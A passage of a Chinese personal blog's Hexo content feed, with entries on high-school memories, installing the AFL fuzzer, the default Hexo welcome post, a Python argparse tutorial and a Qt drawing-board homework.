<h4 id="18-一段不为人知的故事"><a href="#18-一段不为人知的故事" class="headerlink" title="18.一段不为人知的故事"></a>18.一段不为人知的故事</h4><p>我也不知道还有什么事别人都不知道</p>
<h4 id="19-会像主动向别人分享的故事"><a href="#19-会像主动向别人分享的故事" class="headerlink" title="19.会像主动向别人分享的故事"></a>19.会像主动向别人分享的故事</h4><p>性格开朗广泛交友后来幡然醒悟改过自新？</p>
<h4 id="20-从来没去过的地方"><a href="#20-从来没去过的地方" class="headerlink" title="20.从来没去过的地方"></a>20.从来没去过的地方</h4><p>翔宇楼天台</p>
<h4 id="21-别开生面的学校活动"><a href="#21-别开生面的学校活动" class="headerlink" title="21.别开生面的学校活动"></a>21.别开生面的学校活动</h4><p>百团大战？</p>
<p>在龙哥的带领下趴在地上画坑</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231505526.png"  alt="image-20200224231505526" style="zoom:25%;">

<p>说起来真的挺可惜的，nk在”追求高考成绩“的大环境下失去了太多</p>
<p>吹一波书画社</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231307416.png"  alt="image-20200224231307416" style="zoom:25%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231320919.png"  alt="image-20200224231320919" style="zoom: 33%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231338792.png"  alt="image-20200224231338792" style="zoom:33%;"></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231505526.png"  alt="image-20200225095719714" style="zoom:25%;">

<h4 id="22-同学们的奇怪的昵称-绰号"><a href="#22-同学们的奇怪的昵称-绰号" class="headerlink" title="22.同学们的奇怪的昵称/绰号"></a>22.同学们的奇怪的昵称/绰号</h4><p>八卦相关🙂</p>
<h4 id="23-军训"><a href="#23-军训" class="headerlink" title="23.军训"></a>23.军训</h4><p>坐在第一排看小姐姐们跳舞</p>
<h4 id="24-一个很有趣的同学"><a href="#24-一个很有趣的同学" class="headerlink" title="24.一个很有趣的同学"></a>24.一个很有趣的同学</h4><p>黄教官哈哈哈哈哈</p>
<p>他真的太有趣了哈哈哈哈</p>
<h4 id="25-校园传说"><a href="#25-校园传说" class="headerlink" title="25.校园传说"></a>25.校园传说</h4><p>（空）</p>
<p>但历史悠久</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224232457810.png"  alt="image-20200224232457810" style="zoom:25%;">

<h4 id="26-讲讲寝室-走读的事"><a href="#26-讲讲寝室-走读的事" class="headerlink" title="26.讲讲寝室/走读的事"></a>26.讲讲寝室/走读的事</h4><p>上学路上的同学们</p>
<p>一起在地铁上玩游戏的lx</p>
<p>考完试可以去同学家玩</p>
<h4 id="27-高三"><a href="#27-高三" class="headerlink" title="27.高三"></a>27.高三</h4><p>一起上晚自习的同学们</p>
<p>在金牌楼下大声唱”对面的女孩看过来“的fj，和女生宿舍楼里传出的回应”看个p“</p>
<p>六年唯一的一年没有空调</p>
<h4 id="28-高考前一周"><a href="#28-高考前一周" class="headerlink" title="28.高考前一周"></a>28.高考前一周</h4><p>不停地做卷子，班里剩的人也不多了，气氛还是比较轻松的</p>
<h4 id="29-毕业典礼"><a href="#29-毕业典礼" class="headerlink" title="29.毕业典礼"></a>29.毕业典礼</h4><p>六年真的是要结束了啊</p>
<h4 id="30-如果回到高中开学的前一天你会对当初的自己说什么？"><a href="#30-如果回到高中开学的前一天你会对当初的自己说什么？" class="headerlink" title="30.如果回到高中开学的前一天你会对当初的自己说什么？"></a>30.如果回到高中开学的前一天你会对当初的自己说什么？</h4><p>且行且珍惜，笔芯♥</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224232047764.png"  alt="image-20200224232047764" style="zoom:25%;">



<p>最后</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224232014063.png"  alt="image-20200224232014063" style="zoom: 33%;">

]]></content>
      <categories>
        <category>my life :)</category>
      </categories>
  </entry>
  <entry>
    <title>AFL的安装与使用</title>
    <url>/2020/02/19/AFL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>运行环境：kali2020.1</p>
<a id="more"></a>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;AFL.git</span><br><span class="line">cd AFL</span><br><span class="line">make </span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><code>export CC=afl-clang；export CXX=afl-clang++；</code></p>
<ul>
<li><p>成功1：<a href="https://xz.aliyun.com/t/4314" target="_blank" rel="noopener">https://xz.aliyun.com/t/4314</a></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/image-20200222125143977.png"  alt="image-20200222125143977" style="zoom:50%;">
</li>
<li><p>成功2：<a href="https://www.secpulse.com/archives/71876.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/71876.html</a><img src="/img/loading.gif" class="lazyload" data-src="/images/image-20200222125123470.png"  alt="image-20200222125123470" style="zoom:50%;"></p>
<ul>
<li>标注：<ul>
<li>文中的ELF文件：在fuzz_input文件夹中新建一个testcase.ELF文件</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>AFL</category>
      </categories>
      <tags>
        <tag>AFL</tag>
        <tag>漏洞挖掘</tag>
        <tag>linux</tag>
        <tag>工具</tag>
        <tag>模糊测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/02/14/hello-world/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<a id="more"></a>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>利用argparse编写python命令行工具</title>
    <url>/2020/01/21/python/argparse/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote>
<p>官方文档<br><a href="https://docs.python.org/zh-cn/3.7/howto/argparse.html" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3.7/howto/argparse.html</a><br><a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#module-argparse" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3.7/library/argparse.html#module-argparse</a></p>
</blockquote>
<h1 id="基础功能"><a href="#基础功能" class="headerlink" title="基础功能"></a>基础功能</h1><p><code>--help</code> 选项，也可缩写为 <code>-h</code>，是唯一一个可以直接使用的选项</p>
<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.parse_args()</span><br></pre></td></tr></table></figure>



<h2 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h2><h3 id="默认参数类型"><a href="#默认参数类型" class="headerlink" title="默认参数类型"></a>默认参数类型</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line"><span class="comment"># add_argument用于指定程序能够接受哪些命令行选项</span></span><br><span class="line">parser.add_argument(<span class="string">"echo"</span>, help=<span class="string">"echo the string you use here"</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">print(args.echo)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py -h</span><br><span class="line">usage: exer.py [-h] echo</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  echo</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help  show this help message <span class="keyword">and</span> exit</span><br></pre></td></tr></table></figure>

<p>接收echo参数（字符串格式），并打印</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py helloworld</span><br><span class="line">helloworld</span><br></pre></td></tr></table></figure>



<h3 id="其它类型"><a href="#其它类型" class="headerlink" title="其它类型"></a>其它类型</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">"square"</span>, help=<span class="string">"display a square of a given number"</span>,</span><br><span class="line">                    type=int)<span class="comment"># 指定为int类型</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line">print(args.square**<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>计算平方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py 5</span><br><span class="line">25</span><br></pre></td></tr></table></figure>



<h2 id="可选参数"><a href="#可选参数" class="headerlink" title="可选参数"></a>可选参数</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">"--verbosity"</span>, help=<span class="string">"increase output verbosity"</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="keyword">if</span> args.verbosity:</span><br><span class="line">    <span class="comment"># 如果一个可选参数没有被使用时，相关变量被赋值为 None，在此例中是 args.verbosity</span></span><br><span class="line">    print(<span class="string">"verbosity turned on"</span>)</span><br></pre></td></tr></table></figure>

<p>不输入参数不报错</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">python exer.py</span></span><br></pre></td></tr></table></figure>

<p>help</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py -h</span><br><span class="line">usage: exer.py [-h] [--verbosity VERBOSITY]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  --verbosity VERBOSITY</span><br><span class="line">                        increase output verbosity</span><br></pre></td></tr></table></figure>

<p>需要指定参数的具体值</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py --verbosity</span><br><span class="line">usage: exer.py [-h] [--verbosity VERBOSITY]</span><br><span class="line">exer.py: error: argument --verbosity: expected one argument</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">python exer.py --verbosity 1</span></span><br><span class="line">verbosity turned on</span><br></pre></td></tr></table></figure>



<p><strong>action=store_true</strong></p>
<p><code>&quot;store_true&quot;</code>意味着，当这一选项存在时，为 <code>args.verbose</code> 赋值为 <code>True</code>。没有指定时则隐含地赋值为 <code>False</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser.add_argument(<span class="string">"--verbose"</span>, help=<span class="string">"increase output verbosity"</span>,</span><br><span class="line">                    action=<span class="string">"store_true"</span>)</span><br></pre></td></tr></table></figure>



<h3 id="短选项"><a href="#短选项" class="headerlink" title="短选项"></a>短选项</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser.add_argument(<span class="string">"-v"</span>, <span class="string">"--verbose"</span>, help=<span class="string">"increase output verbosity"</span>,</span><br><span class="line">                    action=<span class="string">"store_true"</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py -h</span><br><span class="line">usage: exer.py [-h] [-v]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help     show this help message <span class="keyword">and</span> exit</span><br><span class="line">  -v, --verbose  increase output verbosity</span><br></pre></td></tr></table></figure>

<p>此时，该项依旧为可选项。若去掉<code>--verbose</code>只留下<code>-v</code>，则该项为必需项</p>
<h2 id="结合位置参数和可选参数"><a href="#结合位置参数和可选参数" class="headerlink" title="结合位置参数和可选参数"></a>结合位置参数和可选参数</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">"square"</span>, type=int,</span><br><span class="line">                    help=<span class="string">"display a square of a given number"</span>)</span><br><span class="line">parser.add_argument(<span class="string">"-v"</span>, <span class="string">"--verbose"</span>, action=<span class="string">"store_true"</span>,</span><br><span class="line">                    help=<span class="string">"increase output verbosity"</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">answer = args.square**<span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> args.verbose:</span><br><span class="line">    print(<span class="string">"the square of &#123;&#125; equals &#123;&#125;"</span>.format(args.square, answer))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(answer)</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py -h</span><br><span class="line">usage: exer.py [-h] [-v] square</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  square         display a square of a given number</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help     show this help message and exit</span><br><span class="line">  -v, --verbose  increase output verbosity</span><br></pre></td></tr></table></figure>

<p>若没有参数，则报错</p>
<p>两个参数的顺序可以颠倒</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py 5 -v</span><br><span class="line">the square of 5 equals 25</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py -v 5</span><br><span class="line">the square of 5 equals 25</span><br></pre></td></tr></table></figure>

<h3 id="参数取值范围限制"><a href="#参数取值范围限制" class="headerlink" title="参数取值范围限制"></a>参数取值范围限制</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">"square"</span>, type=int,</span><br><span class="line">                    help=<span class="string">"display a square of a given number"</span>)</span><br><span class="line"><span class="comment"># 限制取值为0，1，2，若赋其他值，则报错</span></span><br><span class="line">parser.add_argument(<span class="string">"-v"</span>, <span class="string">"--verbosity"</span>, type=int, choices=[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">                    help=<span class="string">"increase output verbosity"</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">answer = args.square**<span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> args.verbosity == <span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"the square of &#123;&#125; equals &#123;&#125;"</span>.format(args.square, answer))</span><br><span class="line"><span class="keyword">elif</span> args.verbosity == <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"&#123;&#125;^2 == &#123;&#125;"</span>.format(args.square, answer))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(answer)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py -v 2 4</span><br><span class="line">the square of 4 equals 16</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py -v 1 4</span><br><span class="line">4^2 &#x3D;&#x3D; 16</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py 4</span><br><span class="line">16</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py -v 0 4</span><br><span class="line">16</span><br></pre></td></tr></table></figure>



<p><strong>action=”count”</strong></p>
<p>参数值为该参数出现了几次</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">"square"</span>, type=int,</span><br><span class="line">                    help=<span class="string">"display the square of a given number"</span>)</span><br><span class="line">parser.add_argument(<span class="string">"-v"</span>, <span class="string">"--verbosity"</span>, action=<span class="string">"count"</span>,</span><br><span class="line">                    help=<span class="string">"increase output verbosity"</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">answer = args.square**<span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> args.verbosity == <span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"the square of &#123;&#125; equals &#123;&#125;"</span>.format(args.square, answer))</span><br><span class="line"><span class="keyword">elif</span> args.verbosity == <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"&#123;&#125;^2 == &#123;&#125;"</span>.format(args.square, answer))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(answer)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py -v 0</span><br><span class="line">0^2 &#x3D;&#x3D; 0</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py -v 0 -v</span><br><span class="line">the square of 0 equals 0</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py -vv 0</span><br><span class="line">the square of 0 equals 0</span><br></pre></td></tr></table></figure>



<p><strong>关键字default</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser.add_argument(<span class="string">"-v"</span>, <span class="string">"--verbosity"</span>, action=<span class="string">"count"</span>, default=<span class="number">0</span>,</span><br><span class="line">                    help=<span class="string">"increase output verbosity"</span>)</span><br></pre></td></tr></table></figure>

<p>默认情况下如果一个可选参数没有被指定，它的值会是 <code>None</code>，并且它不能和整数值相比较（所以产生了 <a href="https://docs.python.org/zh-cn/3.7/library/exceptions.html#TypeError" target="_blank" rel="noopener"><code>TypeError</code></a> 异常）。</p>
<h2 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">"x"</span>, type=int, help=<span class="string">"the base"</span>)</span><br><span class="line">parser.add_argument(<span class="string">"y"</span>, type=int, help=<span class="string">"the exponent"</span>)</span><br><span class="line">parser.add_argument(<span class="string">"-v"</span>, <span class="string">"--verbosity"</span>, action=<span class="string">"count"</span>, default=<span class="number">0</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">answer = args.x**args.y</span><br><span class="line"><span class="keyword">if</span> args.verbosity &gt;= <span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"&#123;&#125; to the power &#123;&#125; equals &#123;&#125;"</span>.format(args.x, args.y, answer))</span><br><span class="line"><span class="keyword">elif</span> args.verbosity &gt;= <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"&#123;&#125;^&#123;&#125; == &#123;&#125;"</span>.format(args.x, args.y, answer))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(answer)</span><br></pre></td></tr></table></figure>

<p>修改部分内容为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> args.verbosity &gt;= <span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"Running '&#123;&#125;'"</span>.format(__file__)) <span class="comment"># 输出文件名</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;python exer.py -vv 0 8</span><br><span class="line">Running &#39;exer.py&#39;</span><br><span class="line">0^8 &#x3D;&#x3D; 0</span><br></pre></td></tr></table></figure>



<h2 id="矛盾选项"><a href="#矛盾选项" class="headerlink" title="矛盾选项"></a>矛盾选项</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">"calculate X to the power of Y"</span>)</span><br><span class="line">group = parser.add_mutually_exclusive_group()</span><br><span class="line">group.add_argument(<span class="string">"-v"</span>, <span class="string">"--verbose"</span>, action=<span class="string">"store_true"</span>)</span><br><span class="line">group.add_argument(<span class="string">"-q"</span>, <span class="string">"--quiet"</span>, action=<span class="string">"store_true"</span>)</span><br><span class="line">parser.add_argument(<span class="string">"x"</span>, type=int, help=<span class="string">"the base"</span>)</span><br><span class="line">parser.add_argument(<span class="string">"y"</span>, type=int, help=<span class="string">"the exponent"</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">answer = args.x**args.y</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.quiet:</span><br><span class="line">    print(answer)</span><br><span class="line"><span class="keyword">elif</span> args.verbose:</span><br><span class="line">    print(<span class="string">"&#123;&#125; to the power &#123;&#125; equals &#123;&#125;"</span>.format(args.x, args.y, answer))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"&#123;&#125;^&#123;&#125; == &#123;&#125;"</span>.format(args.x, args.y, answer))</span><br></pre></td></tr></table></figure>

<p>参数<code>-v</code>和<code>-q</code>不可以同时使用</p>
<h1 id="argparse-—-命令行选项、参数和子命令解析器"><a href="#argparse-—-命令行选项、参数和子命令解析器" class="headerlink" title="argparse — 命令行选项、参数和子命令解析器"></a><a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#module-argparse" target="_blank" rel="noopener"><code>argparse</code></a> — 命令行选项、参数和子命令解析器</h1><p><a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#argparse.ArgumentParser.add_argument" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3.7/library/argparse.html#argparse.ArgumentParser.add_argument</a></p>
<p>官方文档写的太好了，我重写一遍意义不大，大家直接去看官方文档吧</p>
<h2 id="add-argument-方法"><a href="#add-argument-方法" class="headerlink" title="add_argument() 方法"></a>add_argument() 方法</h2><ul>
<li>ArgumentParser.add_argument(<em>name or flags…</em>[, <em>action</em>][, <em>nargs</em>][, <em>const</em>][, <em>default</em>][, <em>type</em>][, <em>choices</em>][, <em>required</em>][, <em>help</em>][, <em>metavar</em>][, <em>dest</em>])</li>
</ul>
<ul>
<li><p>定义单个的命令行参数应当如何解析。每个形参都在下面有它自己更多的描述，长话短说有：</p>
</li>
<li><p><a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#name-or-flags" target="_blank" rel="noopener">name or flags</a> - 一个命名或者一个选项字符串的列表，例如 <code>foo</code> 或 <code>-f, --foo</code>。</p>
</li>
<li><p><a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#action" target="_blank" rel="noopener">action</a> - 当参数在命令行中出现时使用的动作基本类型。</p>
</li>
<li><p><a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#nargs" target="_blank" rel="noopener">nargs</a> - 命令行参数应当消耗的数目。</p>
</li>
<li><p><a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#const" target="_blank" rel="noopener">const</a> - 被一些 <a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#action" target="_blank" rel="noopener">action</a> 和 <a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#nargs" target="_blank" rel="noopener">nargs</a> 选择所需求的常数。</p>
</li>
<li><p><a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#default" target="_blank" rel="noopener">default</a> - 当参数未在命令行中出现时使用的值。</p>
</li>
<li><p><a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#type" target="_blank" rel="noopener">type</a> - 命令行参数应当被转换成的类型。</p>
</li>
<li><p><a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#choices" target="_blank" rel="noopener">choices</a> - 可用的参数的容器。<a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#required" target="_blank" rel="noopener">required</a> - 此命令行选项是否可省略 （仅选项可用）。</p>
</li>
<li><p><a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#help" target="_blank" rel="noopener">help</a> - 一个此选项作用的简单描述。</p>
</li>
<li><p><a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#metavar" target="_blank" rel="noopener">metavar</a> - 在使用方法消息中使用的参数值示例。</p>
</li>
<li><p><a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#dest" target="_blank" rel="noopener">dest</a> - 被添加到 <a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#argparse.ArgumentParser.parse_args" target="_blank" rel="noopener"><code>parse_args()</code></a> 所返回对象上的属性名。</p>
</li>
</ul>
<h3 id="action"><a href="#action" class="headerlink" title="action"></a>action</h3><h4 id="store"><a href="#store" class="headerlink" title="store"></a>store</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  ...: parser = argparse.ArgumentParser()</span><br><span class="line">  ...: parser.add_argument(<span class="string">'--foo'</span>, action=<span class="string">'store_true'</span>)</span><br><span class="line">  ...: parser.add_argument(<span class="string">'--bar'</span>, action=<span class="string">'store_false'</span>)</span><br><span class="line">  ...: parser.add_argument(<span class="string">'--baz'</span>, action=<span class="string">'store_false'</span>)</span><br><span class="line">  ...: parser.parse_args(<span class="string">'--foo --bar'</span>.split())</span><br><span class="line">Out[<span class="number">2</span>]: Namespace(bar=<span class="literal">False</span>, baz=<span class="literal">True</span>, foo=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>argparse</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt作业二：画图板</title>
    <url>/2019/08/31/Qt/Qt%E4%BD%9C%E4%B8%9A%E4%BA%8C%E2%80%94%E2%80%94%E7%94%BB%E5%9B%BE%E6%9D%BF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h3 id="一、界面设计"><a href="#一、界面设计" class="headerlink" title="一、界面设计"></a>一、界面设计</h3><p>利用designer设计menubar和toolbar<br>遇到的问题和解决方法：<br>toolbar和menubar重叠，拖动toolbar部件至屏幕右侧即可。<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/d8i77lp27ad7u5mdfth4ivte/image_1df8880jt10m8g53v041efd6j29.png"  alt="image_1df8880jt10m8g53v041efd6j29.png-246.9kB"><br>menubar中可以添加子选项<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/mbukua86v9pv56obgta3og2o/image_1df88esf0le118bvdh91a0b130d9.png"  alt="image_1df88esf0le118bvdh91a0b130d9.png-256.2kB"></p>
<hr>
<h3 id="二、paint类属性"><a href="#二、paint类属性" class="headerlink" title="二、paint类属性"></a>二、paint类属性</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QPixmap *pix;&#x2F;&#x2F;设置画图背景</span><br><span class="line">QPoint start;&#x2F;&#x2F;鼠标按下时的坐标</span><br><span class="line">QPoint end;&#x2F;&#x2F;鼠标抬起时的坐标</span><br><span class="line">int status;&#x2F;&#x2F;画图状态，1：直线，2：矩形，3：椭圆，4：自由绘图</span><br><span class="line">QPen pen;&#x2F;&#x2F;设置线条的属性</span><br><span class="line">QBrush brush;&#x2F;&#x2F;设置填充属性</span><br></pre></td></tr></table></figure>

<hr>
